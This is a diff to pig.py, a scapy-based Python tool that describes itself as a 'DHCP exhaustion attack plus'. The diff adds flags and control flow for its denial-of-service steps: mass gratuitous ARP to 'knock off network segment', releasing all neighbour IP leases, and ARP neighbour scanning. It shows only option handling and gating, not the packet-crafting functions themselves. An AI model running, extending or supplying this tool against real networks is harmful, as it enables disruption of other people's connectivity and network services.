@@ -4,23 +4,27 @@
 DHCP exhaustion attack plus.
 
 Usage:
-    pig.py [-d -h -6 -f -a -i -o -x -y -z] <interface>
+    pig.py [-d -h -6 -f -a -i -o -x -y -z -g -r -n] <interface>
   
 Options:
-    -d, --debug            ... enable scapy verbose output
-    -h, --help             <- you are here :)
+    -d, --debug                    ... enable scapy verbose output
+    -h, --help                     <-- you are here :)
     
-    -6, --ipv6             ... DHCPv6 (off, DHCPv4 by default)
+    -6, --ipv6                     ... DHCPv6 (off, DHCPv4 by default)
     
-    -f, --fuzz             ... randomly fuzz packets (off)
+    -f, --fuzz                     ... randomly fuzz packets (off)
     
-    -a, --show-arp         ... detect/print arp who_has (off)
-    -i, --show-icmp        ... detect/print icmps requests (off)
-    -o, --show-options     ... print lease infos (off)
+    -a, --show-arp                 ... detect/print arp who_has (off)
+    -i, --show-icmp                ... detect/print icmps requests (off)
+    -o, --show-options             ... print lease infos (off)
     
-    -x, --timeout-threads  ... thread spawn timer (0.4)
-    -y, --timeout-dos      ... DOS timeout (8) (wait time to mass grat.arp)
-    -z, --timeout-dhcpequest.. dhcp request timeout (2)
+    -g, --neighbors-attack-garp    ... knock off network segment using gratious arps (off)
+    -r, --neighbors-attack-release ... release all neighbor ips (off)
+    -n, --neighbors-scan-arp       ... arp neighbor scan (off)
+    
+    -x, --timeout-threads          ... thread spawn timer (0.4)
+    -y, --timeout-dos              ... DOS timeout (8) (wait time to mass grat.arp)
+    -z, --timeout-dhcpequest       ... dhcp request timeout (2)
 """
 from scapy.all import *
 import string,binascii,signal,sys,threading,socket,struct,getopt
@@ -36,15 +40,18 @@ show_icmp = False
 show_options = False
 MODE_IPv6 = False
 MODE_FUZZ = False
+DO_GARP = False
+DO_RELEASE = False
+DO_ARP = False
 timeout={}
 timeout['dos']=8        #todo(tintinweb): add these values to getopt
 timeout['dhcpip']=2
 timeout['timer']=0.4
 
 def checkArgs():
-    global show_arp ,show_icmp, show_options, timeouts, MODE_IPv6, MODE_FUZZ
+    global show_arp ,show_icmp, show_options, timeouts, MODE_IPv6, MODE_FUZZ, DO_ARP, DO_GARP, DO_RELEASE
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "hdaiox:y:z:6f")
+        opts, args = getopt.getopt(sys.argv[1:], "hdaiox:y:z:6fgrn")
     except getopt.GetoptError, err:
         # print help information and exit:
         print str(err) # will print something like "option -a not recognized"
@@ -72,6 +79,13 @@ def checkArgs():
             MODE_IPv6=True
         elif o in ("-f", "--fuzz"):
             MODE_FUZZ=True
+        elif o in ("-g", "--neighbors-attack-garp"):
+            DO_GARP=True
+        elif o in ("-r", "--neighbors-attack-release"):
+            DO_RELEASE=True
+        elif o in ("-n", "--neighbors-scan-arp"):
+            DO_ARP=True
+            
         else:
             assert False, "unhandled option"
     if len(args)==1:
@@ -386,17 +400,17 @@ def main():
         time.sleep(timeout['dhcpip'])
         print "[  ? ] \t\twaiting for first DHCP Server response"
     
-    neighbors()
-    release()
+    if DO_ARP: neighbors()
+    if DO_RELEASE: release()
     
     while not dhcpdos:
         time.sleep(timeout['dos'])
         print "[  ? ] \t\twaiting for DHCP pool exhaustion..."
-        
-    print "[DONE] DHCP pool exhausted!"
-    print "[INFO] waiting %s to mass grat.arp!"%timeout['dos']
-    time.sleep(timeout['dos'])
-    garp()
+    
+    if DO_GARP:   
+        print "[INFO] waiting %s to mass grat.arp!"%timeout['dos']
+        time.sleep(timeout['dos'])
+        garp()
     print "[DONE] DHCP pool exhausted!"
   
 def usage():
